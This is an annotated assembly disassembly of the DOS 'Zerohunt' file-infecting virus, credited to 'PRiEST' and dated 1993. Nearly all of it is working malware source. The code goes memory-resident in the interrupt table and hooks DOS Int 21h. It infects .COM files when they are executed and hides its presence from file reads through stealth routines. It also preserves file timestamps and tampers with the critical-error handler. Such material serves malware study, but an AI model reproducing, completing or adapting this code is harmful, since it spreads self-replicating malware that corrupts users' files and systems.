CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
        org 100h

;                              Zerohunt virus
;                           Disassembly by PRiEST
;                                 4-15-93


CMC_JMP         equ 0e9f5h              ;This is the virus's signature
                                        ;which is located at the beginning
                                        ;of infected files, it consist of
                                        ;a CMC and a JMP

Mem_Loc         equ 21ch                ;offset of virus in memory

Zero_Size       equ offset Zero_End-offset Zero_Start      ;Size of virus
Zero_File_Size  equ offset Zero_File_End-offset Zero_Start ;Size of virus in
                                                           ;file

IVT_21          equ 21h*4h              ;offset of Int 21h in IVT
IVT_24          equ 24h*4h              ;offset of Int 24h in IVT

Mem_Size        equ 413h                ;offset of Memory size in BIOS area

Zerohunt:       jmp Zero_Start          ;Dummy code
                nop
                
                org 21ch                ;set new origin

Zero_Start:     call $+3                ;Push IP
                pop si                  ;pop IP into SI
                mov es,ax               ;ES = segemnt zero
                mov di,Mem_Loc          ;Offset of memory resident code
                cmp byte ptr es:[di],0e8h ;This instructions checks to see
                                        ;if the virus is already in memory
                                        ;by looking for the call at 
                                        ;Zero_Start in the IVT
                je Jump_File            ;return control to file if in memory
                mov cx,Zero_Size        ;size of virus
                sub si,3h               ;Find offset of Zero_Start
                rep movsb               ;copy us to IVT
                push es
                pop ds                  ;DS = 0
                mov bx,IVT_21           ;offset of Interrupt 21 in the IVT
                les si,ds:[bx]          ;Get seg:off of Int 21h
                mov word ptr ds:[bx],offset Zero_21 ;Point Int 21h to us
                mov word ptr ds:[bx+2h],ax          ;point Int 21h to segment 0
                mov word ptr ds:[Old_21+2h],es      ;Save Int 21h
                mov word ptr ds:[Old_21],si         ;Save Int 21h
                mov al,40h              ;40h k
                mov bx,ds:[Mem_Size]    ;Get amount of memory in k's
                sub bx,ax               ;subtract 40h to get segment of mem
                mul bx                  ;find address of free memory
                mov word ptr ds:[High_Mem],ax       ;Save segment address
                xor ax,ax               ;Zero out AX
Jump_File:      push cs
                push cs
                pop ds                  ;Restore DS and ES 
                pop es

;Self-modifying code that restores the first 4 bytes of an infected .com
;file.  The Jump_Data defines where to jump when the virus is done, this
;is because it only infects files that have a JMP (0e9h) as the first
;instruction, any other file gets ignored.

                db 0c7h,6,0,1           ;mov word ptr ds:[100h],
File_Data       dw 20cdh                ;quit to DOS

                db 0c7h,6,2,1           ;mov word ptr ds:[102h],
File_Data_2     dw 9090h                ;NOPs

                db 0e9h                 ;Jump

;This is where the infected program originally jumped to, right now it's
;set back to the beginning so that it will terminate to DOS.

Jump_Data       dw 0-(offset Jump_Data_End-offset Zero_Start)
Jump_Data_End:                          ;used to find offset of Zero_Start

Random_Read:    pushf                   ;Keep stack in order when IRET
                push cs                 ;return to this segment
                call Jump_21            ;Call DOS to read file
                pushf
                push ax                 
                push es
                push bx
                push ds                 ;save registers
                mov ah,2fh              ;Get address of DTA into ES:BX
                int 21h                 
                push es
                pop ds                  ;DTA segment in DS
                cmp word ptr ds:[bx],CMC_JMP ;Is this file infected?
                jne Skip_Block_Clean
                call Stealth            ;Hide virus
Skip_Block_Clean:pop ds
                pop bx
                pop es
                pop ax                  ;Pop registers
                jmp Fix_Flags_Ret       ;Fix flags and return

Handle_Read:    pushf                   ;Keep stack right
                push cs                 ;return to this segment
                call Jump_21
                pushf                   ;Save flags
                jb Fix_Flags_Ret
                xchg dx,bx              ;Address of data read into BX
                cmp word ptr ds:[bx],CMC_JMP ;File infected?
                jne Fix_Flags_DX
                cmp word ptr ds:[bx+2h],ax ;is it valid (? I guess)
                jnb Fix_Flags_DX
                call Stealth            ;Hide virus

Fix_Flags_DX:   xchg dx,bx              ;restore registers
Fix_Flags_Ret:  popf                    ;POP flags
                push bp
                push ax                 ;Save registers
                pushf
                pop ax                  ;tranfer flags to ax
                mov bp,sp               ;get stack frame
                mov ss:[bp+8h],ax       ;Save flags directly into stack
                pop ax
                pop bp                  ;POP registers
                iret
                
Stealth:        push si                 ;Save register
                mov si,bx               ;Where code was read to
                add si,ds:[bx+2h]       ;Where virus is in program
                push word ptr ds:[si+File_Data-Zero_Start]   ;original bytes
                pop word ptr ds:[bx]                         ;restore them
                push word ptr ds:[si+File_Data_2-Zero_Start] ;original bytes
                pop word ptr ds:[bx+2h] ;restore them too
                add si,4h               ;fix for jump
                push ax
                push cx                 ;save registers
                mov cx,Zero_Size        ;Size of virus
                xor al,al               ;Zero out AL
Stealth_Loop:   mov byte ptr ds:[si],al ;Remove virus from file
                inc si
                loop Stealth_Loop
                pop cx
                pop ax
                pop si                  ;Pop registers
                retn


Zero_21:        cmp ah,21h              ;Random read?
                je Random_Read
                cmp ah,27h              ;Random Block read?
                je Random_Read
                cmp ah,3fh              ;Handle read?
                je Handle_Read
                cmp ax,4b00h            ;Execute program?
                je Infect
                jmp Jump_21             ;Jump to original Int 21h

Infect:         push es                 ;save registers
                push ax
                push bx
                push dx
                push ds
                mov ax,3d02h            ;open file for writing
                int 21h
                xchg ax,bx              ;handle into BX
                mov ah,3fh              ;read from file
                xor cx,cx               ;Zero CX
                mov ds,cx               ;zero into DS
                inc cx                  ;read one byte
                mov dx,offset Buffer    ;read to variable "buffer"
                mov si,dx               ;same into SI
                pushf                   ;Keep stack straight after IRET
                push cs                 ;Push CS for Far return
                call Jump_21            ;Call original Interrupt 21
                cmp byte ptr ds:[si],0e9h ;Is the first instruction a jump?
                je File_Has_Jump
                jmp Close_File          ;File is not valid, close and quit
File_Has_Jump:  mov ax,4200h            ;Set position from start of file
                dec cx                  ;CX now equals 0
                xor dx,dx               ;DX also equals 0
                int 21h                 ;set file position to start of file
                pop ds
                pop dx                  ;POP location of file name        
                push dx
                push ds                 ;PUSH them back
                push bx                 ;Save file handle number
                push cs
                pop es                  ;Set ES to our CS
                mov bx,offset High_Mem  ;offset of variable High_Mem
                mov ax,4b03h            ;Load file
                int 21h
                mov ds,es:[bx]          ;Get address of High memory
                mov cx,Zero_File_Size   ;size of virus in File
                mov dx,cx               ;same into DX
                mov bx,ds:[1h]          ;Get jump address
                mov bp,bx               ;I don't recall BP being saved!!!
                xor al,al               ;zero out AL
Search_Loop:    dec bx                  ;decrement pointer
                pop di                  ;Pop handle
                je Close_File_DI
                push di                 ;Save handle again
                cmp byte ptr ds:[bx],al ;search for zeros
                je Search_Looper
                mov cx,dx               ;reset counter
Search_Looper:  loop Search_Loop        ;Scan for size of virus
                mov di,bp               ;Get jump address of file
                sub di,bx               ;minus location of zeros
                sub di,offset Jump_Data_End-offset Zero_Start  ;Make jump
                mov word ptr cs:[Jump_Data],di ;Save original jump address
                push word ptr ds:[0]    ;save original bytes
                pop word ptr cs:[File_Data]  ;Into our own code
                push word ptr ds:[2h]   ;again with bytes 3 and 4
                pop word ptr cs:[File_Data_2]
                mov si,Mem_Loc          ;location of virus in memory
                mov cx,dx               ;Size of virus in file
                dec cx                  ;Size of virus
                push ds
                pop es                  ;ES = segment of free memory
                push cs
                pop ds                  ;DS = our segment
                mov di,bx               ;offset of free space in file
                rep movsb               ;copy virus into file (I gather)
                sub bx,4h               ;subtract for jump to virus
                mov word ptr es:[2h],bx ;Fix jump
                mov word ptr es:[0],CMC_JMP ;CMC, then JMP
                mov di,0cfcfh
                lds si,ds:[IVT_24]      ;fetch address of Int 24h
                xchg di,ds:[si]         ;what the hey!?  Computer should
                                        ;crash if Int 24h is triggered!
                pop bx                  ;POP handle number
                mov ax,5700h            ;Get date
                int 21h
                push cx
                push dx                 ;save original date/time of file
                push es
                pop ds                  ;DS = segment of free memory
                mov ah,40h
                mov cx,bp               ;size of virus
                xor dx,dx
                int 21h                 ;write to file, I guess the virus
                pop dx
                pop cx                  ;POP the date/time
                mov ax,5701h            ;restore date/time to file
                int 21h                 
                xchg di,bx              ;dummy exchange if infection ok
Close_File_DI:  xchg di,bx              ;retore handle from DI for closing
Close_File:     mov ah,3eh              ;close file
                int 21h                 
                lds si,cs:[IVT_24]      ;Get Int 24h address from IVT
                cmp byte ptr ds:[si],0cfh ;Is it to us?
                jne No_24_Restore       ;I know, they're Shitty labels
                xchg di,ds:[si]         ;restore Int 24h
No_24_Restore:  pop ds
                pop dx
                pop bx
                pop ax
                pop es                  ;Pop all registers

Jump_21:        db 0eah                 ;jmp seg:off
Old_21          dd ?                    ;segment offset of Int 21h

Buffer          db ?

Zero_End:

High_Mem        dw ?                    ;Segment of availible memory

Zero_File_End:

CSEG ENDS
     END Zerohunt
